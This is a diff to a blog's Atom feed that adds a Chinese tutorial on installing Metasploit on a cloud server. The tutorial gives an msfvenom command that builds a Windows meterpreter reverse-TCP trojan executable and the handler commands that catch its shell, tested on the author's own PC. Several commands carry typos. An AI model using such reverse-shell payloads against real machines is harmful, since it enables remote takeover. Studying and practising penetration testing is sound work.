@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://onekingcc.github.io/"/>
-  <updated>2019-09-15T09:15:04.555Z</updated>
+  <updated>2019-09-26T09:26:03.684Z</updated>
   <id>http://onekingcc.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>阿里云服务器搭建外网msf</title>
+    <link href="http://onekingcc.github.io/2019/09/26/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%A4%96%E7%BD%91msf/"/>
+    <id>http://onekingcc.github.io/2019/09/26/阿里云服务器搭建外网msf/</id>
+    <published>2019-09-26T08:35:48.573Z</published>
+    <updated>2019-09-26T09:26:03.684Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="阿里云服务器搭建外网msf"><a href="#阿里云服务器搭建外网msf" class="headerlink" title="阿里云服务器搭建外网msf"></a>阿里云服务器搭建外网msf</h2><p>这里之所以写它，是因为之前买了台阿里云的服务器，搭建过程中也遇到了很多坑，这里使用的是xshell工具连接我的远程服务器，服务器的系统是Ubuntu 18.04，登录进去首先切换成root权限</p><h3 id="踩坑1"><a href="#踩坑1" class="headerlink" title="踩坑1"></a>踩坑1</h3><p>这里我之前只是将自己本机防火墙关闭，然后在监听的时候监听是能监听，但是我触发的可执行文件一直没有会话，忽略阿里云本身还有自带的防火墙，所以要将阿里云的服务器也关掉</p><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p>安装之前要看你的服务是否能够访问外网可以用<code>curl www.baidu.com</code>测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 获取MSF</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall    // 修改权限</span><br><span class="line">./msfinstall    // 开始安装</span><br></pre></td></tr></table></figure><h3 id="安装Nmap"><a href="#安装Nmap" class="headerlink" title="安装Nmap"></a>安装Nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install namp</span><br></pre></td></tr></table></figure><h3 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql  //安装postgresql数据库</span><br><span class="line">su postgres                 //切换到postgres用户</span><br><span class="line">psql                //登录数据库，首次登录没有密码</span><br><span class="line">/password postgres          //修改密码</span><br><span class="line">/q                          //退出</span><br></pre></td></tr></table></figure><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=外网ip LPORT=监听的端口 -f exe &gt;x64.exe</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485138005.png" alt="1569485138005"></p><h3 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole      //启动msf</span><br><span class="line">use exploit/muliti/handler //监听</span><br><span class="line">set payload windows/x64/meterpreter/reverser_tcp //设置载荷</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT //监听的端口</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485605886.png" alt="1569485605886"></p><p>这里将之前的生成的x64.exe执行文件放在我们的本机 ，本机执行这个文件，这时将被监听，新建一个会话将文件下载到本机<code>sz x64.exe</code></p><p><img src="/images/shentouceshi/1569486332944.png" alt="1569486332944"></p><p>这时我们就直接进入目标的shell</p><p><img src="/images/shentouceshi/1569486454599.png" alt="1569486454599"></p><p>查看目标机信息：</p><p><img src="/images/shentouceshi/1569487055550.png" alt="1569487055550"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我的服务器生成exe，将exe下载到本地电脑，本地电脑相当于目标机器，exe就相当于一个反向链接程序，将流量转发到我的攻击机器上。</p><p>reference：<a href="http://ximcx.cn/post-117.html" target="_blank" rel="noopener">http://ximcx.cn/post-117.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;a href=&quot;#阿里云服务器搭建外网msf&quot; class=&quot;headerlink&quot; title=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;/a&gt;阿里云服务器搭建外网msf&lt;/h2&gt;&lt;p&gt;这里之所以写它，是因为之前买了台阿里云的服务器，搭建
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://onekingcc.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>文件上传漏洞</title>
